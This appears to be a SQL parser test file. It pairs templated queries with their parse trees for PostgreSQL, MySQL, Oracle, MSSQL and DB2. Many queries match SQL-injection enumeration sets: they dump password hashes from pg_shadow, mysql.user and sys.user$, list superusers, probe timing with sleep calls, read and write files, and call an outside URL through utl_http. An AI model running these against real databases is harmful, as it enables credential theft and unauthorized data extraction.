query.query: SELECT user
SELECT current_user
SELECT session_user
SELECT getpgusername()
SELECT usename, passwd FROM pg_shadow
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
SELECT pg_sleep(10)
SELECT usename FROM pg_user WHERE usesuper IS TRUE
SELECT version()
SELECT current_database()
SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {@row@}
SELECT usename FROM pg_user order by usename limit 1 offset {@row@}

SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind='r' AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) limit 1 offset {@row@}

SELECT attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') limit 1 offset {@row@}

SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '{@column_name@}' limit 1 offset {@row@}
SELECT CAST({@COLUMN_NAME@} as text) FROM {@table_name@} limit 1 offset {@row@}
SELECT user()
SELECT @@version
SELECT database()
SELECT schema_name FROM information_schema.schemata limit 1 offset {@row@}
SELECT user FROM mysql.user limit 1 offset {@row@}
SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}
SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 1 offset {@row@}
SELECT column_name FROM information_schema.columns WHERE table_schema like '{@DATABASE@}' and table_name like '{@TABLE_NAME@}' limit 1 offset {@row@}
SELECT CONCAT(user,':',password) FROM mysql.user limit 1 offset {@row@}
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION grantee)) (ALIAS (COLUMN_EXPRESSION privilege_type)) (ALIAS (COLUMN_EXPRESSION is_grantable))) (FROM (ALIAS (user_privileges information_schema))) (WHERE (= (COLUMN_EXPRESSION SUPER) (COLUMN_EXPRESSION privilege_type)))))

query.query: SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’
SELECT concat(File_priv,':',Create_priv,':',Select_priv) FROM mysql.user where user like '{@user_name@}' limit 1 offset {@row@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION concat (COLUMN_EXPRESSION File_priv) (STRING_LITERAL ':') (COLUMN_EXPRESSION Create_priv) (STRING_LITERAL ':') (COLUMN_EXPRESSION Select_priv)))) (FROM (ALIAS (user mysql))) (where (like (STRING_LITERAL 'user_name') (COLUMN_EXPRESSION user)))) (limit 1 1))

query.query: LOAD_FILE('{@file_name@}')
SELECT table_name FROM information_schema.columns WHERE column_name like '{@COLUMN_NAME@}' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}
SELECT {@COLUMN_NAME@} FROM {@table_name@} limit 1 offset {@row@}
SELECT BENCHMARK(1000000,MD5(‘A’))
SELECT SLEEP(5)
SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’
select user from dual@{@DBLINK@}
select owner from (select owner, rownum as r from (SELECT distinct owner FROM all_tables@{@DBLINK@})) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tables)))))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT banner FROM v$version@{@DBLINK@} WHERE banner LIKE 'Oracle%%'
SELECT sys_context('USERENV', 'ISDBA') FROM dual@{@DBLINK@}
SELECT SYS.DATABASE_NAME FROM DUAL@{@DBLINK@}
SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: select utl_http.request('{@URL@}') from dual@{@DBLINK@}
select table_name from (SELECT table_name, rownum as r FROM all_tables@{@DBLINK@}) where r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tables)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns@{@DBLINK@} where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS all_tab_columns)) (where (= (STRING_LITERAL '{@USER_NAME@}') (COLUMN_EXPRESSION owner))))))))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (|| (|| (COLUMN_EXPRESSION USERNAME) (STRING_LITERAL ':')) (COLUMN_EXPRESSION DB_LINK)))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION DB_LINK)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS ALL_DB_LINKS)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: select table_name from (SELECT table_name, rownum as r FROM user_tables@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS user_tables)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS user_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))

query.query: SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))

query.query: select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}@{@DBLINK@}) where r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS table_name)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT UTL_INADDR.get_host_name FROM dual@{@DBLINK@}
SELECT UTL_INADDR.get_host_address FROM dual@{@DBLINK@}
SELECT user FROM dual
SELECT owner FROM (select owner, rownum as r from (SELECT distinct owner FROM all_tables)) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tables)))))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT banner FROM v$version WHERE banner LIKE 'Oracle%%'
SELECT banner FROM v$version WHERE banner LIKE 'TNS%%'
SELECT version FROM v$instance
SELECT sys_context('USERENV', 'ISDBA') FROM dual
SELECT name, password, astatus FROM sys.user$
SELECT name,spare4 FROM sys.user$
SELECT SYS.DATABASE_NAME FROM DUAL
SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: select utl_http.request('{@URL@}') from dual
select table_name from (SELECT table_name, rownum as r FROM all_tables) where r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tables)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS all_tab_columns)) (where (= (STRING_LITERAL '{@USER_NAME@}') (COLUMN_EXPRESSION owner))))))))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (|| (|| (COLUMN_EXPRESSION USERNAME) (STRING_LITERAL ':')) (COLUMN_EXPRESSION DB_LINK)))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION DB_LINK)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS ALL_DB_LINKS)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: select table_name from (SELECT table_name, rownum as r FROM user_tables) where r BETWEEN {@ROW@} and {@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS user_tables)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))

query.query: SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS user_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))

query.query: SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))

query.query: select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}) where r={@ROW@}
query.parsed: (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS table_name)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))

query.query: SELECT UTL_INADDR.get_host_name FROM dual
SELECT UTL_INADDR.get_host_address FROM dual
select user
SELECT TOP 1 name FROM master..syslogins where name not in (SELECT TOP {@ROW@} name FROM master..syslogins ORDER BY name DESC) ORDER BY name DESC
select @@version
SELECT DB_NAME()
SELECT DB_NAME({@ROW@})

select top 1 name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') and name not in (select top {@ROW@} name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') order by name desc) order by name desc
select top 1 name from {@DATABASE@}..sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM {@DATABASE@}..sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC
select top 1 name from sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC

SELECT top 1 sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' and sysobjects.name not in (SELECT top {@row@} sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' order by sysobjects.name desc) order by sysobjects.name desc

select top 1 cast({@COLUMN_NAME@} as varchar) from {@table_name@} where {@column_name@} not in (SELECT TOP {@row@} {@COLUMN_NAME@} FROM {@TABLE_NAME@} order by {@COLUMN_NAME@} desc) ORDER BY {@COLUMN_NAME@} DESC
(cast(is_srvrolemember('sysadmin') as varchar))
select user from sysibm.sysdummy1
select versionnumber, version_timestamp from sysibm.sysversions
